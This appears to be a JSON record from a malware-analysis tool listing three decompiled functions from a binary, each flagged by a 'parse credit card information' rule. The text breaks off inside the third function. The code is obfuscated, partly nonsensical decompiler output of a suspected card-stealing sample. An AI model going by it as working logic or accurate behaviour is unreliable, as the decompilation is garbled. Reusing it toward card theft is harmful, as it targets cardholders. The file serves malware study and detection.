{
    "00401100": {
        "rules": [
            "parse credit card information/0fcc6283562247e58776c7b51a92f681"
        ],
        "decompiled_code": "\n// WARNING: Instruction at (ram,0x0040136f) overlaps instruction at (ram,0x0040136e)\n// \n// WARNING: Unable to track spacebase fully for stack\n// WARNING: Restarted to delay deadcode elimination for space: stack\n\nuint * __cdecl fcn.00401100(uchar *arg_8h, uint arg_ch)\n\n{\n    char cVar1;\n    uint8_t uVar2;\n    uint16_t uVar3;\n    uint32_t in_EAX;\n    uint *puVar4;\n    uchar *puVar5;\n    uint16_t uVar6;\n    uint in_ECX;\n    uint uVar7;\n    uint32_t in_EDX;\n    uchar *puVar8;\n    uint32_t unaff_EBX;\n    uint32_t uVar9;\n    uint *puVar10;\n    uint *puVar12;\n    int32_t *piVar14;\n    uint8_t **ppuVar15;\n    int32_t *piVar16;\n    int32_t iVar17;\n    uint unaff_ESI;\n    uint uVar18;\n    uint32_t uVar19;\n    uint unaff_EDI;\n    int32_t iVar20;\n    uint32_t uVar21;\n    uint8_t *puVar22;\n    ushort in_CS;\n    bool in_CF;\n    bool bVar23;\n    uint8_t in_AF;\n    bool bVar24;\n    uint8_t in_TF;\n    uint8_t in_IF;\n    bool bVar25;\n    uint8_t in_NT;\n    uint8_t in_AC;\n    uint8_t in_VIF;\n    uint8_t in_VIP;\n    uint8_t in_ID;\n    ushort uStack28;\n    ushort uStack26;\n    uint16_t uStack24;\n    uint16_t uStack22;\n    ushort uStack20;\n    uint16_t uStack18;\n    uint *puVar11;\n    uint *puVar13;\n    \n    puVar4 = &stack0xfffffffc;\n    puVar10 = &stack0xfffffffc;\n    puVar11 = &stack0xfffffffc;\n    uStack22 = in_EAX;\n    uStack20 = in_ECX >> 0x10;\n    uStack26 = unaff_ESI;\n    uStack24 = unaff_ESI >> 0x10;\n    cVar1 = in_EAX;\n    *arg_8h = 0x4a;\n    uStack18 = uStack22;\n    if ((!in_CF && cVar1 != '\\x01') && (uStack20 = uStack26,  uStack18 = uStack24,  in_CF || cVar1 == '\\x01')) {\n        do {\n    // WARNING: Do nothing block with infinite loop\n        } while( true );\n    }\n    arg_8h[1] = 0xcb;\n    if ((cVar1 < '\\x02') || ('\\x01' < cVar1)) {\n        arg_8h[2] = 0x78;\n        uStack20 = unaff_EDI;\n        uStack18 = unaff_EDI >> 0x10;\n    }\n    uVar3 = uStack18;\n    puVar12 = &stack0xffffffec;\n    puVar13 = &stack0xffffffec;\n    uVar19 = unaff_EBX & 0xffff0000 | CONCAT11((unaff_EBX >> 8) + *(in_EAX + 0x57), unaff_EBX);\n    uVar6 = arg_8h;\n    bVar23 = (POPCOUNT(in_EDX - 1U & uVar6 & 0xff) & 1U) == 0;\n    uVar9 = in_EDX & 0xffff;\n    arg_8h[3] = 0xd4;\n    if ((!bVar23) && (bVar23)) {\n        cVar1 = '\\x1e';\n        do {\n            puVar4 = puVar4 + -1;\n            puVar12 = puVar12 + -1;\n            *puVar12 = *puVar4;\n            cVar1 = cVar1 + -1;\n        } while ('\\0' < cVar1);\n        puVar4 = in(0x78);\n        return puVar4;\n    }\n    arg_8h[4] = 199;\n    if ((!bVar23) && (bVar23)) {\n        cVar1 = '\\x1e';\n        do {\n            puVar10 = puVar10 + -1;\n            puVar13 = puVar13 + -1;\n            *puVar13 = *puVar10;\n            cVar1 = cVar1 + -1;\n        } while ('\\0' < cVar1);\n        puVar4 = in(0x78);\n        return puVar4;\n    }\n    arg_8h[5] = 0x4a;\n    uStack18 = in_EAX >> 0x10;\n    uStack28 = uVar9;\n    arg_8h[6] = 0x5f;\n    arg_8h[7] = 0x35;\n    iVar20 = CONCAT22(uVar3, uStack20);\n    arg_8h[8] = 0x9f;\n    uVar2 = uVar9;\n    uVar3 = ((uStack22 & 0xff | (in_EAX >> 8) - 0x2b << 8) ^ 0x3d) + 0x7c28 ^ CONCAT11(uVar9 >> 8 | uVar2, uVar2);\n    arg_8h[9] = 0xf;\n    if ((0x4001 < uVar3) && (uVar3 < 0x4002)) {\n        do {\n    // WARNING: Do nothing block with infinite loop\n        } while( true );\n    }\n    arg_8h[10] = 0x68;\n    arg_8h[0xb] = 0x53;\n    bVar25 = SBORROW1(uVar2, 'Q');\n    bVar23 = uVar2 + 0xaf < '\\0';\n    arg_8h[0xc] = 0xdf;\n    if ((0x51 < uVar2) && (uVar2 < 0x52)) {\n        bVar25 = false;\n        in_EAX = in_EAX & 0xe2f4cc58;\n        bVar23 = in_EAX < 0;\n    }\n    arg_8h[0xd] = 0xc4;\n    if ((bVar25 != bVar23) || (uStack20 = uStack18,  uStack18 = uVar6,  bVar25 == bVar23)) {\n        arg_8h[0xe] = 0x25;\n        uStack20 = in_EAX;\n        uStack18 = in_EAX >> 0x10;\n        in_EAX = in_EAX ^ 0x3d;\n        uStack22 = in_EDX >> 0x10;\n    }\n    piVar14 = &stack0xffffffe8 ^ *(uVar19 - 0x3a);\n    *(piVar14 + -1) = in_CS;\n    puVar8 = piVar14[-1];\n    *(in_EAX + 0x10) = 0xc5;\n    *(piVar14 + 2) = uVar6;\n    *(piVar14 + -2) = uVar19;\n    *(piVar14 + -6) = in_EAX + 1;\n    puVar5 = in_EAX + 1 | 0x561b;\n    bVar23 = puVar5 < puVar8;\n    uVar9 = puVar5 - puVar8;\n    bVar24 = uVar9 == 0;\n    bVar25 = (POPCOUNT(uVar9 & 0xff) & 1U) == 0;\n    uVar18 = *(piVar14 + -6);\n    uVar9 = *(piVar14 + -2);\n    uVar3 = *(piVar14 + 2);\n    arg_8h[0x10] = 0xcd;\n    if (bVar25) {\ncode_r0x004012c9:\n        arg_8h[0x11] = 0x6b;\n        puVar5 = arg_8h;\n        ppuVar15 = piVar14 + 1;\n        piVar16 = &stack0xfffffffc;\n        if ((!bVar24) && (ppuVar15 = piVar14 + 1,  piVar16 = &stack0xfffffffc,  bVar24)) {\n            *piVar14 = &stack0xfffffffc;\n            cVar1 = '\\x10';\n            piVar16 = piVar14;\n            do {\n                puVar11 = puVar11 + -1;\n                piVar16 = piVar16 + -1;\n                *piVar16 = *puVar11;\n                cVar1 = cVar1 + -1;\n            } while ('\\0' < cVar1);\n            piVar14[-0x11] = piVar14;\n            ppuVar15 = piVar14 + -0x5e5f;\n            piVar16 = piVar14;\n        }\n    }\n    else {\n        *piVar14 = iVar20;\n        iVar20 = *piVar14;\n        if (!bVar25) goto code_r0x004012c9;\n        uVar18 = 0x34a96cf4;\n        piVar16 = *0xc617b43a;\n        *(uVar9 + 0x74) = piVar16 + *(uVar9 + 0x74);\n        puVar22 = iVar20 + -0x37fb8a25;\n        uVar2 = uVar3 & 7;\n        *puVar22 = *puVar22 << uVar2 | *puVar22 >> 8 - uVar2;\n        uVar19 = (uVar3 & 0x1f) != 0 && (*puVar22 & 1) != 0;\n        bVar23 = uVar9 < *0x34a96d05 || uVar9 - *0x34a96d05 < uVar19;\n        uVar9 = (uVar9 - *0x34a96d05) - uVar19;\n        bVar24 = uVar9 == 0;\n        puVar5 = puVar8 + 2 | 0x8bff8b66;\n        puVar8 = arg_8h;\n        ppuVar15 = piVar14 + 1;\n    }\n    puVar5[0x12] = 0x22;\n    if ((!bVar23 && !bVar24) && (bVar23 || bVar24)) {\n        puVar5 = puVar5 & 0xe2f4cc58;\n    }\n    puVar5[0x13] = 0x38;\n    ppuVar15[-1] = arg_8h & 0xffff0000 | uVar3;\n    uVar7 = ppuVar15[-1];\n    puVar5[0x14] = 0x79;\n    ppuVar15[-1] = puVar5;\n    ppuVar15[-2] = uVar7;\n    ppuVar15[-3] = puVar8;\n    ppuVar15[-4] = uVar9;\n    ppuVar15[-5] = ppuVar15;\n    ppuVar15[-6] = piVar16;\n    ppuVar15[-7] = uVar18;\n    ppuVar15[-8] = iVar20;\n    uVar21 = ppuVar15[-8];\n    uVar19 = ppuVar15[-7];\n    iVar17 = ppuVar15[-6];\n    uVar7 = ppuVar15[-4];\n    uVar9 = ppuVar15[-3];\n    uVar18 = ppuVar15[-2];\n    iVar20 = *(iVar17 + 8);\n    *(iVar20 + 0x15) = 0xa0;\n    ppuVar15[-1] = uVar7;\n    uVar7 = ppuVar15[-1];\n    *(iVar20 + 0x16) = 0x1a;\n    *(ppuVar15 + -2) = uVar18;\n    *(ppuVar15 + -6) = uVar7;\n    *(ppuVar15 + -10) = uVar19;\n    bVar23 = uVar9 <= (uVar19 | 0x561b);\n    *(iVar20 + 0x17) = 0xc9;\n    if (bVar23) {\n        *(ppuVar15 + -2) = uVar21;\n        puVar22 = uVar21 & 0xffff0000 | *(ppuVar15 + -2);\n        if (!bVar23) goto code_r0x0040135f;\n    }\n    iVar20 = *(iVar17 + 0xc);\n    puVar22 = *ppuVar15;\n    ppuVar15 = ppuVar15 + 2;\ncode_r0x0040135f:\n    uVar2 = iVar20;\n    cVar1 = uVar2 - *puVar22;\n    *(ppuVar15 + -4) =\n         (in_NT & 1) * 0x4000 | SBORROW1(uVar2, *puVar22) * 0x800 | (in_IF & 1) * 0x200 | (in_TF & 1) * 0x100 |\n         (cVar1 < '\\0') * 0x80 | (cVar1 == '\\0') * 0x40 | (in_AF & 1) * 0x10 | ((POPCOUNT(cVar1) & 1U) == 0) * 4 |\n         uVar2 < *puVar22 | (in_ID & 1) * 0x200000 | (in_VIP & 1) * 0x100000 | (in_VIF & 1) * 0x80000 |\n         (in_AC & 1) * 0x40000;\n    *(ppuVar15 + -8) = 0x401369;\n    uStack24 = uStack28;\n    puVar4 = func_0x101872e1();\n    *puVar4 = 0x18;\n    return puVar4;\n}\n",
        "token_count": 3161
    },
    "004016c0": {
        "rules": [
            "parse credit card information/0fcc6283562247e58776c7b51a92f681"
        ],
        "decompiled_code": "\n// WARNING: Instruction at (ram,0x004016fc) overlaps instruction at (ram,0x004016f7)\n// \n// WARNING: Restarted to delay deadcode elimination for space: stack\n\nint32_t __cdecl fcn.004016c0(int32_t arg_8h, uint32_t arg_ch)\n\n{\n    uint32_t uVar1;\n    int32_t in_EAX;\n    int32_t iVar2;\n    uint8_t uVar3;\n    uint32_t in_EDX;\n    uint32_t uVar4;\n    bool bVar5;\n    \n    uVar4 = 0;\n    uVar1 = arg_ch;\n    if (arg_ch != 0) {\n        do {\n            bVar5 = (POPCOUNT(uVar1 & 0xff) & 1U) == 0;\n            if ((bVar5) || (!bVar5)) {\n                iVar2 = (*_sym.imp.MSVCRT.dll_rand)();\n            }\n            else {\n                uVar4 = 0x34a96cf4;\n                iVar2 = in_EDX + 0x40509d;\n            }\n            in_EAX = iVar2 / 0x1a;\n            uVar3 = iVar2 % 0x1a + 0x61;\n            in_EDX = iVar2 % 0x1a & 0xffffff00U | uVar3;\n            *(uVar4 + arg_8h) = uVar3;\n            uVar4 = uVar4 + 1;\n            uVar1 = uVar4 - arg_ch;\n        } while (uVar4 < arg_ch);\n    }\n    return in_EAX;\n}\n",
        "token_count": 363
    },
    "00402e90": {
        "rules": [
            "parse credit card information/0fcc6283562247e58776c7b51a92f681"
        ],
        "decompiled_code": "\n// WARNING: Control flow encountered bad instruction data\n// WARNING: Instruction at (ram,0x0040347a) overlaps instruction at (ram,0x00403476)\n// \n// WARNING: Could not reconcile some variable overlaps\n\nulong __thiscall fcn.00402e90(uint param_1, uint param_2)\n\n{\n    int32_t *piVar1;\n    uint *puVar2;\n    uint32_t uVar3;\n    int16_t iVar4;\n    uint8_t extraout_AH;\n    int32_t in_EAX;\n    uint32_t *puVar5;\n    int32_t iVar6;\n    uint uVar7;\n    uchar *puVar8;\n    char extraout_CH;\n    char extraout_CH_00;\n    ushort extraout_CX;\n    uint16_t uVar9;\n    uint extraout_ECX;\n    int32_t extraout_ECX_00;\n    int32_t extraout_ECX_01;\n    uint32_t extraout_ECX_02;\n    int32_t extraout_ECX_03;\n    char extraout_DL;\n    char extraout_DL_00;\n    ushort extraout_DX;\n    uint extraout_EDX;\n    int32_t extraout_EDX_00;\n    uint8_t *unaff_EBX;\n    uint *puVar10;\n    uint *unaff_EBP;\n    uint32_t unaff_ESI;\n    uchar *puVar11;\n    uint32_t unaff_EDI;\n    uint16_t in_ES;\n    uint8_t uVar12;\n    uchar uVar13;\n    uint8_t in_AF;\n    uchar uVar14;\n    bool bVar15;\n    char cVar16;\n    char cVar17;\n    bool bVar18;\n    ulong uVar19;\n    char *pcStack24232;\n    uint uStack24228;\n    uint uStack24224;\n    char *pcStack24220;\n    char *pcStack24216;\n    char *pcStack24212;\n    uint32_t uStack24208;\n    char *pcStack24204;\n    char *pcStack24200;\n    char *pcStack24196;\n    char *pcStack24192;\n    char *pcStack24188;\n    uint uStack24184;\n    uint uStack24180;\n    uint uStack24176;\n    uint uStack24172;\n    uchar *puStack93;\n    uint uStack64;\n    uchar uStack60;\n    ushort uStack59;\n    uint uStack57;\n    char *pcStack53;\n    uchar uStack49;\n    uchar uStack48;\n    ushort uStack47;\n    uchar uStack45;\n    uchar uStack44;\n    ushort uStack43;\n    uint uStack41;\n    uchar uStack37;\n    char *pcStack36;\n    uchar auStack28 [3];\n    uint uStack25;\n    uint uStack21;\n    uchar uStack17;\n    ushort uStack16;\n    uchar uStack14;\n    uchar uStack13;\n    uchar uStack12;\n    ushort uStack11;\n    uchar uStack9;\n    uchar uStack8;\n    ushort uStack7;\n    uchar uStack5;\n    uint8_t *puVar20;\n    \n    uStack8 = unaff_ESI;\n    uStack7 = unaff_ESI >> 8;\n    uStack5 = unaff_ESI >> 0x18;\n    puVar20 = unaff_EBX;\n    while( true ) {\n        uStack12 = unaff_EDI;\n        uStack11 = unaff_EDI >> 8;\n        uStack9 = unaff_EDI >> 0x18;\n        uVar13 = uStack9;\n        uVar12 = false;\n        uVar14 = (CONCAT11((in_EAX >> 8) - param_1, in_EAX + '\\x01') - 1U & 0x637b) == 0;\n        uStack16 = 10;\n        uStack14 = 0;\n        uStack13 = 0;\n        uStack17 = 0;\n        uStack21 = 0x4104c400;\n        auStack28[0] = 0xc0;\n        auStack28[1] = 9;\n        auStack28[2] = 0x41;\n        uStack25 = 0x1200;\n        puVar5 = fcn.00402760();\n        if ((uVar12) || (!uVar12)) break;\n        in_EAX = puVar5 + 1;\n        uStack8 = 0x8b;\n        uStack7 = 0xf8c0;\n        uStack5 = 0xb7;\n        param_1 = extraout_ECX;\n        if (&stack0xffffffe4 < *puVar5 || in_EAX == 0) {\n    // WARNING: Bad instruction - Truncating control flow here\n            halt_baddata();\n        }\n    }\n    pcStack36 = str.eZ7Iy;\n    uStack37 = 0;\n    uStack44 = 0xc0;\n    uStack43 = 0x4109;\n    uStack41._1_3_ = 0x12;\n    uStack41._0_1_ = 0;\n    while( true ) {\n        uStack48 = 0xf8;\n        uStack47 = 0x402e;\n        uStack45 = 0;\n        fcn.00402760();\n        if ((!uVar12 && !uVar14) && (uVar12 || uVar14)) {\n            do {\n    // WARNING: Do nothing block with infinite loop\n            } while( true );\n        }\n        uStack48 = 4;\n        uStack47 = 0;\n        uStack45 = 0;\n        uStack49 = 0;\n        pcStack53 = 0x4104e400;\n        uStack60 = 0xc0;\n        uStack59 = 0x4109;\n        uStack57 = 0x1200;\n        uStack64 = 0x402f15;\n        uVar12 = fcn.00402760();\n        cVar17 = '\\0';\n        cVar16 = (uVar12 ^ 0xca) < '\\0';\n        uVar14 = (uVar12 ^ 0xca) == 0;\n        uStack16 = 0xc;\n        uStack14 = 0;\n        uStack13 = 0;\n        uStack17 = 0;\n        uStack21 = 0x4104e800;\n        auStack28[0] = 0xc0;\n        auStack28[1] = 9;\n        auStack28[2] = 0x41;\n        uStack25._1_3_ = 0x12;\n        uStack25._0_1_ = 0;\n        fcn.00402760();\n        auStack28[0] = 7;\n        auStack28[1] = 0;\n        auStack28[2] = 0;\n        uStack25 = uStack25._1_3_ << 8;\n        pcStack36 = 0x12;\n        uStack44 = 0x65;\n        uStack43 = 0x402f;\n        uStack41._0_1_ = 0;\n        uVar12 = fcn.00402760();\n        if ((uVar14 || cVar17 != cVar16) || (!uVar14 && cVar17 == cVar16)) break;\n        uVar12 = 9 < (uVar12 & 0xf) | in_AF;\n        in_AF = uVar12;\n        if (extraout_ECX_00 != 0) {\n            do {\n    // WARNING: Do nothing block with infinite loop\n            } while( true );\n        }\n    }\n    uStack44 = 0xb;\n    uStack43 = 0;\n    uStack41 = uStack41._1_3_ << 8;\n    uStack48 = 0xfc;\n    uStack47 = 0x4104;\n    uStack45 = 0;\n    uStack49 = 0;\n    pcStack53 = 0x1200;\n    uStack60 = 0x8a;\n    uStack59 = 0x402f;\n    uStack57 = 0x4109c000;\n    fcn.00402760();\n    uStack12 = 0xc;\n    uStack11 = 0;\n    uStack9 = 0;\n    uStack16 = 0x508;\n    uStack14 = 0x41;\n    uStack13 = 0;\n    uStack17 = 0;\n    uStack21 = 0x1200;\n    auStack28[0] = 0xbb;\n    auStack28[1] = 0x2f;\n    auStack28[2] = 0x40;\n    uStack25 = 0x4109c000;\n    fcn.00402760();\n    bVar18 = false;\n    uStack12 = 8;\n    uStack11 = 0;\n    uStack9 = 0;\n    uStack16 = 0x514;\n    uStack14 = 0x41;\n    uStack13 = 0;\n    uStack17 = 0;\n    uStack21._1_3_ = 0x12;\n    uStack21._0_1_ = 0;\n    auStack28[0] = 0xeb;\n    auStack28[1] = 0x2f;\n    auStack28[2] = 0x40;\n    uStack25._1_3_ = 0x4109c0;\n    uStack25._0_1_ = 0;\n    fcn.00402760();\n    if ((!bVar18) && (bVar18)) {\n        *CONCAT13(uStack21, uStack25._1_3_) = param_2;\n        return CONCAT44(puVar20, param_2);\n    }\n    auStack28[0] = 0xd;\n    auStack28[1] = 0;\n    auStack28[2] = 0;\n    uStack25 = uStack25._1_3_ << 8;\n    pcStack36 = 0x12;\n    uStack37 = 0;\n    uStack44 = 0x1e;\n    uStack43 = 0x4030;\n    uStack41._1_3_ = 0x4109c0;\n    uStack41._0_1_ = 0;\n    fcn.00402760();\n    if ((!bVar18) && (bVar18)) {\n        uVar7 = CONCAT13(uStack9, CONCAT21(uStack11, uStack12));\n        *CONCAT13(uStack37, uStack41._1_3_) = uVar7;\n        return CONCAT44(CONCAT13(uStack17, uStack21._1_3_), uVar7);\n    }\n    uStack44 = 0x18;\n    uStack43 = 0;\n    uStack41 = uStack41._1_3_ << 8;\n    uStack48 = 0x2c;\n    uStack47 = 0x4105;\n    uStack45 = 0;\n    uStack49 = 0;\n    pcStack53 = 0x1200;\n    uStack60 = 0x51;\n    uStack59 = 0x4030;\n    uStack57 = 0x4109c000;\n    fcn.00402760();\n    uStack41 = uStack41 & 0xff | unaff_EDI << 8;\n    cVar17 = SBORROW1(extraout_CH + -1, '\\x05');\n    cVar16 = extraout_CH + -6 < '\\0';\n    bVar18 = extraout_CH + -1 == '\\x05';\n    uVar3 = unaff_EDI & 0xffffff;\n    uStack37 = uVar13;\n    uStack12 = 0x25;\n    uStack11 = 0;\n    uStack9 = 0;\n    uStack16 = 0x544;\n    uStack14 = 0x41;\n    uStack13 = 0;\n    uStack17 = 0;\n    uStack21 = 0x1200;\n    auStack28[0] = 0x83;\n    auStack28[1] = 0x30;\n    auStack28[2] = 0x40;\n    uStack25._1_3_ = 0x4109c0;\n    uStack25._0_1_ = 0;\n    fcn.00402760();\n    if (!bVar18 && cVar17 == cVar16) {\n        uStack25._0_1_ = unaff_ESI >> 8;\n        unaff_ESI = unaff_ESI & 0xffff0000 | unaff_ESI & 0xff | uStack25 << 8;\n    }\n    auStack28[0] = 10;\n    auStack28[1] = 0;\n    auStack28[2] = 0;\n    uStack25 = uStack25._1_3_ << 8;\n    pcStack36 = 0x12;\n    uStack37 = 0;\n    uStack44 = 0xa2;\n    uStack43 = 0x4030;\n    uStack41 = 0x4109c000;\n    fcn.00402760();\n    uStack12 = 0xc;\n    uStack11 = 0;\n    uStack9 = 0;\n    uStack16 = 0x578;\n    uStack14 = 0x41;\n    uStack13 = 0;\n    uStack17 = 0;\n    uStack21 = 0x1200;\n    auStack28[0] = 0xc2;\n    auStack28[1] = 0x30;\n    auStack28[2] = 0x40;\n    uStack25 = 0x4109c000;\n    fcn.00402760();\n    uStack41 = uStack41 & 0xff | uVar3 << 8;\n    uVar12 = extraout_CH_00 - 1;\n    bVar18 = uVar12 < 5;\n    uVar14 = SBORROW1(uVar12, '\\x05');\n    bVar15 = uVar12 == 5;\n    uStack12 = 0xd;\n    uStack11 = 0;\n    uStack9 = 0;\n    uStack16 = 0x584;\n    uStack14 = 0x41;\n    uStack13 = 0;\n    uStack17 = 0;\n    uStack21 = 0x1200;\n    auStack28[0] = 0xf4;\n    auStack28[1] = 0x30;\n    auStack28[2] = 0x40;\n    uStack25._1_3_ = 0x4109c0;\n    uStack25._0_1_ = 0;\n    uStack37 = uVar13;\n    pcStack36 = unaff_ESI;\n    fcn.00402760();\n    if ((bVar18 || bVar15) || (!bVar18 && !bVar15)) {\n        auStack28[0] = 6;\n        auStack28[1] = 0;\n        auStack28[2] = 0;\n        uStack25._0_1_ = 0;\n    }\n    else {\n        piVar1 = unaff_EDI + 0x6a;\n        uVar14 = SBORROW4(*piVar1, &stack0xffffffe8);\n        *piVar1 = *piVar1 - &stack0xffffffe8;\n        auStack28[0] = in_ES;\n        auStack28[1] = in_ES >> 8;\n    }\n    pcStack36 = 0x12;\n    uStack37 = 0;\n    uStack44 = 0x17;\n    uStack43 = 0x4031;\n    uStack41._1_3_ = 0x4109c0;\n    uStack41._0_1_ = 0;\n    fcn.00402760();\n    if ((uVar14) || (!uVar14)) {\n        uStack44 = 5;\n        uStack43 = 0;\n        uStack41._0_1_ = 0;\n    }\n    uStack48 = 0x9c;\n    uStack47 = 0x4105;\n    uStack45 = 0;\n    uStack49 = 0;\n    pcStack53 = 0x1200;\n    uStack60 = 0x41;\n    uStack59 = 0x4031;\n    uStack57 = 0x4109c000;\n    fcn.00402760();\n    uStack12 = 0xd;\n    uStack11 = 0;\n    uStack9 = 0;\n    uStack16 = 0x5a4;\n    uStack14 = 0x41;\n    uStack13 = 0;\n    uStack17 = 0;\n    uStack21 = 0x1200;\n    auStack28[0] = 0x76;\n    auStack28[1] = 0x31;\n    auStack28[2] = 0x40;\n    uStack25 = 0x4109c000;\n    fcn.00402760();\n    cVar17 = '\\0';\n    uVar9 = CONCAT11(extraout_CX >> 8 & unaff_EBX >> 8, extraout_CX | unaff_EBX) & uVar3;\n    cVar16 = uVar9 < 0;\n    bVar18 = uVar9 == 0;\n    uStack12 = 0x19;\n    uStack11 = 0;\n    uStack9 = 0;\n    uStack16 = 0x5b4;\n    uStack14 = 0x41;\n    uStack13 = 0;\n    uStack17 = 0;\n    uStack21 = 0x1200;\n    auStack28[0] = 0xa1;\n    auStack28[1] = 0x31;\n    auStack28[2] = 0x40;\n    uStack25._1_3_ = 0x4109c0;\n    uStack25._0_1_ = 0;\n    fcn.00402760();\n    if (!bVar18 && cVar17 == cVar16) {\n        uStack25._0_1_ = unaff_ESI >> 8;\n        unaff_ESI = unaff_ESI & 0xffff0000 | unaff_ESI & 0xff | uStack25 << 8;\n    }\n    auStack28[0] = 0xf;\n    auStack28[1] = 0;\n    auStack28[2] = 0;\n    uStack25 = uStack25._1_3_ << 8;\n    pcStack36 = 0x12;\n    uStack37 = 0;\n    uStack44 = 0xc0;\n    uStack43 = 0x4031;\n    uStack41 = 0x4109c000;\n    iVar6 = fcn.00402760();\n    bVar18 = (POPCOUNT(iVar6 + 1U & 0xff) & 1U) == 0;\n    uStack12 = 0xe;\n    uStack11 = 0;\n    uStack9 = 0;\n    uStack16 = 0x5e0;\n    uStack14 = 0x41;\n    uStack13 = 0;\n    uStack17 = 0;\n    uStack21 = 0x1200;\n    auStack28[0] = 0xdd;\n    auStack28[1] = 0x31;\n    auStack28[2] = 0x40;\n    uStack25._1_3_ = 0x4109c0;\n    uStack25._0_1_ = 0;\n    fcn.00402760();\n    if ((!bVar18) && (bVar18)) {\n        puVar10 = &stack0xffffffe4;\n        cVar16 = '\\x1e';\n        do {\n            unaff_EBP = unaff_EBP + -1;\n            puVar10 = puVar10 + -1;\n            *puVar10 = *unaff_EBP;\n            cVar16 = cVar16 + -1;\n        } while ('\\0' < cVar16);\n        uVar7 = in(0x78);\n        return CONCAT44(extraout_EDX, uVar7);\n    }\n    auStack28[0] = 0xd;\n    auStack28[1] = 0;\n    auStack28[2] = 0;\n    uStack25 = uStack25._1_3_ << 8;\n    pcStack36 = 0x12;\n    uStack37 = 0;\n    uStack44 = 0xc;\n    uStack43 = 0x4032;\n    uStack41 = 0x4109c000;\n    fcn.00402760();\n    uStack41 = uStack41 & 0xff | uVar3 << 8;\n    uStack12 = 0xc;\n    uStack11 = 0;\n    uStack9 = 0;\n    uStack16 = 0x600;\n    uStack14 = 0x41;\n    uStack13 = 0;\n    uStack17 = 0;\n    uStack21 = 0x1200;\n    auStack28[0] = 0x35;\n    auStack28[1] = 0x32;\n    auStack28[2] = 0x40;\n    uStack25 = 0x4109c000;\n    uStack37 = uVar13;\n    pcStack36 = unaff_ESI;\n    fcn.00402760();\n    uStack12 = 0xf;\n    uStack11 = 0;\n    uStack9 = 0;\n    uStack16 = 0x60c;\n    uStack14 = 0x41;\n    uStack13 = 0;\n    uStack17 = 0;\n    uStack21 = 0x1200;\n    auStack28[0] = 0x6c;\n    auStack28[1] = 0x32;\n    auStack28[2] = 0x40;\n    uStack25 = 0x4109c000;\n    fcn.00402760();\n    uStack12 = 0xb;\n    uStack11 = 0;\n    uStack9 = 0;\n    uStack16 = 0x61c;\n    uStack14 = 0x41;\n    uStack13 = 0;\n    uStack17 = 0;\n    uStack21 = 0x1200;\n    auStack28[0] = 0x90;\n    auStack28[1] = 0x32;\n    auStack28[2] = 0x40;\n    uStack25 = 0x4109c000;\n    fcn.00402760();\n    uStack12 = 0xb;\n    uStack11 = 0;\n    uStack9 = 0;\n    uStack16 = 0x628;\n    uStack14 = 0x41;\n    uStack13 = 0;\n    uStack17 = 0;\n    uStack21 = 0x1200;\n    auStack28[0] = 0xbe;\n    auStack28[1] = 0x32;\n    auStack28[2] = 0x40;\n    uStack25 = 0x4109c000;\n    iVar4 = fcn.00402760();\n    uStack41 = uStack41 & 0xff | uVar3 << 8;\n    bVar18 = iVar4 + 1 < 0;\n    uStack12 = 0xb;\n    uStack11 = 0;\n    uStack9 = 0;\n    uStack16 = 0x634;\n    uStack14 = 0x41;\n    uStack13 = 0;\n    uStack17 = 0;\n    uStack21 = 0x1200;\n    auStack28[0] = 0xdb;\n    auStack28[1] = 0x32;\n    auStack28[2] = 0x40;\n    uStack25._1_3_ = 0x4109c0;\n    uStack25._0_1_ = 0;\n    uStack37 = uVar13;\n    pcStack36 = unaff_ESI;\n    uVar19 = fcn.00402760();\n    if ((bVar18) || (!bVar18)) {\n        auStack28[0] = 10;\n        auStack28[1] = 0;\n        auStack28[2] = 0;\n        uStack25._0_1_ = 0;\n    }\n    puVar8 = uVar19 + -0x1bf31dd6;\n    *unaff_EBX = *unaff_EBX & 0xc3;\n    puVar5 = (uVar19 >> 0x20) + 10;\n    bVar18 = *puVar5 < unaff_EBP;\n    bVar15 = *puVar5 == unaff_EBP;\n    pcStack36 = 0x12;\n    uStack37 = 0;\n    uStack44 = 0xfe;\n    uStack43 = 0x4032;\n    uStack41._1_3_ = 0x4109c0;\n    uStack41._0_1_ = 0;\n    fcn.00402760();\n    if ((!bVar18 && !bVar15) && (bVar18 || bVar15)) {\n        puVar8 = CONCAT13(uStack37, uStack41._1_3_);\n    }\n    uStack41 = 0xc;\n    uStack45 = 0x4c;\n    uStack44 = 6;\n    uStack43 = 0x41;\n    uStack49 = 0x12;\n    uStack48 = 0;\n    uStack47 = 0;\n    pcStack53 = str.R_y_;\n    uStack57 = 0x403328;\n    fcn.00402760();\n    bVar18 = extraout_DL == 'Q';\n    uStack9 = 0xe;\n    uStack8 = 0;\n    uStack7 = 0;\n    uStack13 = 0x58;\n    uStack12 = 6;\n    uStack11 = 0x41;\n    uStack17 = 0x12;\n    uStack16 = 0;\n    uStack14 = 0;\n    uStack21 = str.R_y_;\n    uStack25 = 0x403353;\n    fcn.00402760();\n    if ((!bVar18) && (bVar18)) {\n        puStack93 = &stack0xffffffe7;\n        puVar10 = &stack0xffffffe7;\n        cVar16 = '\\x10';\n        puVar2 = unaff_EBP;\n        do {\n            puVar2 = puVar2 + -1;\n            puVar10 = puVar10 + -1;\n            *puVar10 = *puVar2;\n            cVar16 = cVar16 + -1;\n            uStack25 = unaff_EBP;\n        } while ('\\0' < cVar16);\n    }\n    pcStack24188 = 0x11;\n    pcStack24192 = 0x410668;\n    pcStack24196 = 0x12;\n    pcStack24200 = str.R_y_;\n    pcStack24204 = 0x403375;\n    fcn.00402760();\n    puVar11 = puVar8;\n    if ((!bVar18) && (bVar18)) {\n        puVar11 = puVar8 + 1;\n        out(*puVar8, extraout_DX);\n    }\n    pcStack24204 = 0x13;\n    uStack24208 = 0x41067c;\n    pcStack24212 = 0x12;\n    pcStack24216 = str.R_y_;\n    pcStack24220 = 0x4033a0;\n    fcn.00402760();\n    pcStack24220 = 0x14;\n    uStack24224 = 0x410690;\n    uStack24228 = 0x12;\n    pcStack24232 = str.R_y_;\n    fcn.00402760();\n    if ((0xffffffbf < &stack0xffffa158) || (0xffffffbf >= &stack0xffffa158)) {\n        uStack24172 = 0x33;\n        uStack24176 = 0x4106a4;\n        uStack24180 = 0x12;\n    }\n    puVar8 = unaff_EDI ^ *(unaff_EDI + 0xe58be73);\n    *puVar8 = *puVar11;\n    uStack24184 = CONCAT22(uStack24184._2_2_, in_ES);\n    *(extraout_EDX_00 + 0x12) = *(extraout_EDX_00 + 0x12) + (extraout_ECX_01 + 1 >> 8);\n    pcStack24188 = str.R_y_;\n    pcStack24192 = 0x4033ec;\n    fcn.00402760();\n    uStack24176 = 10;\n    uStack24180 = 0x4106d8;\n    uStack24184 = 